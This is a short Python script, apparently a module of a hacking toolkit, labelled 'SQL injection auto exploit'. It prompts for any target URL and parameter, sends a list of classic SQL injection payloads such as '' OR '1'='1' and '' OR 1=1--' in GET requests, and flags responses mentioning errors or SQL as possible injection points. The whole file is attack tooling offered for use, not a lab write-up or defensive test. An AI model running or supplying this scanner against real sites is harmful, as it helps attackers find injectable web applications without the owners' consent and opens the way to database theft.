import requests

DESCRIPTION = "SQL injection auto exploit"

R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
N = "\033[0m"

PAYLOADS = ["'", '"', "' OR '1'='1", '" OR "1"="1', "'--", '"--', "' OR 1=1--"]

def run():
    url = input(f"{Y}[?] Target URL: {N}")
    param = input(f"{Y}[?] Parameter to test: {N}")
    print(f"{G}[*] Testing SQL injection on {url}...{N}")
    
    for p in PAYLOADS:
        try:
            r = requests.get(url, params={param: p}, timeout=5)
            if "error" in r.text.lower() or "sql" in r.text.lower():
                print(f"{R}[!] Possible SQLi found with payload: {p}{N}")
            else:
                print(f"{G}[+] Payload safe: {p}{N}")
        except:
            print(f"{R}[!] Failed to connect{N}")
